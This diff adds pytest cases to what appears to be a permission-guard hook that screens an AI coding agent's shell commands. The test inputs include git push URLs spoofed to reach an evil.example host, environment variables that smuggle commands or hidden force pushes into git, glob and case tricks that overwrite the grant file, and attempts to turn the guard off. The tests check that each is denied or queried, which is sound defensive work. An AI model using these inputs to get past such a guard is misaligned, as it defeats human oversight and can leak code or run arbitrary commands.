@@ -634,6 +634,102 @@ def test_when_python_missing_and_unattended_then_every_call_denied(
     assert answer.get("permissionDecision") == "deny"
 
 
+@pytest.mark.parametrize(
+    "url",
+    [
+        "https://evil.example\\@github.com/owner/allowed",
+        "https://github.com@evil.example/owner/allowed",
+        "https://evil.example/#@github.com/owner/allowed",
+        "https://github.com/owner/allowed?x=1",
+        "https://github.com.evil.example/owner/allowed",
+        "https://github.com/owner/allowed/../other",
+    ],
+)
+def test_when_push_url_looks_like_granted_remote_then_denied(
+    run: Run, granted: pathlib.Path, url: str
+) -> None:
+    answer = run(
+        granted,
+        {"command": f"git push '{url}' main"},
+        environment={"CLAUDE_GUARD": "deny"},
+    )
+    assert answer.get("permissionDecision") == "deny"
+
+
+@pytest.mark.parametrize(
+    "url",
+    [
+        "HTTPS://GitHub.com/Owner/Allowed.git/",
+        "ssh://git@github.com:22/owner/allowed.git",
+        "https://user@github.com/owner/allowed",
+        "git@github.com:owner/allowed.git",
+    ],
+)
+def test_when_push_url_spells_granted_remote_differently_then_no_decision(
+    run: Run, granted: pathlib.Path, url: str
+) -> None:
+    answer = run(
+        granted,
+        {"command": f"git push '{url}' main"},
+        environment={"CLAUDE_GUARD": "deny"},
+    )
+    assert answer == {}
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0='push -f'; git p",
+        "declare -x GIT_DIR=../remote.git; git log",
+        "GIT_SSH_COMMAND='sh -c id'; export GIT_SSH_COMMAND; git fetch",
+        "env GIT_CONFIG_PARAMETERS=\"'alias.p=push -f'\" git p",
+    ],
+)
+def test_when_git_environment_set_earlier_then_asked(
+    run: Run, repo: pathlib.Path, command: str
+) -> None:
+    answer = run(repo, {"command": command})
+    assert answer.get("permissionDecision") == "ask"
+
+
+def test_when_guard_off_but_mode_unattended_then_denied(
+    run: Run, repo: pathlib.Path
+) -> None:
+    answer = run(
+        repo,
+        {"command": "git push -f"},
+        environment={"CLAUDE_PLUGIN_OPTION_GUARD": "off"},
+        mode="dontAsk",
+    )
+    assert answer.get("permissionDecision") == "deny"
+
+
+def test_when_guard_off_and_input_unparsable_then_still_guarded(
+    run: Run, repo: pathlib.Path
+) -> None:
+    answer = run(
+        repo, {}, raw="{not json", environment={"CLAUDE_PLUGIN_OPTION_GUARD": "off"}
+    )
+    assert answer.get("permissionDecision") == "ask"
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cp notes.md gran?.json",
+        "mv notes.md GRANT.JSON",
+        "cp README.md GRAN*.json",
+        "ln -sf README.md gra*.json",
+        "install -m 644 README.md Grant.Json",
+    ],
+)
+def test_when_grant_overwritten_by_pattern_or_case_then_asked(
+    run: Run, granted: pathlib.Path, command: str
+) -> None:
+    answer = run(granted, {"command": command})
+    assert answer.get("permissionDecision") == "ask"
+
+
 def test_when_bare_repository_deleted_then_asked(run: Run, repo: pathlib.Path) -> None:
     answer = run(repo, {"command": "rm -rf ../remote.git"})
     assert answer.get("permissionDecision") == "ask"
